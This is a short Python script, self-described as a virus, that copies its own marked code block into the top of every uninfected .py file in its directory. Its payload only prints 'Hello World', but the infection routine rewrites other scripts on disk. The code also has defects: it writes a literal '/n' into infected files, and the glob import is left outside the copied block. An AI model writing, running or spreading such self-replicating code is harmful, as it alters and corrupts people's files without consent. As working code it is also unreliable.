""" 
self_replicating.py
    
    - This script will inject self replicating (a virus) code into any existing python scripts in its current directory.
"""

import glob

### BEGIN ###
import sys
from typing import List

code = []
with open(sys.argv[0], "r") as file:
    lines: List[str] = file.readlines()

virus_injected = False
for line in lines:
    if line == "### BEGIN ###\n":
        virus_injected = True
    if virus_injected:
        code.append(line)
    if line == "### END ###\n":
        break

py_scripts: List[str] = glob.glob("*.py")

for script in py_scripts:
    with open(script, "r") as file:
        existing_code = file.readlines()

    infected = False
    for line in existing_code:
        if line == "### BEGIN ###\n":
            infected = True
            break

    if not infected:
        injection = []
        injection.extend(code)
        injection.extend("/n")
        injection.extend(existing_code)

        with open(script, "w") as file:
            file.writelines(injection)

### Payload ###
print("Hello World")

### END ###
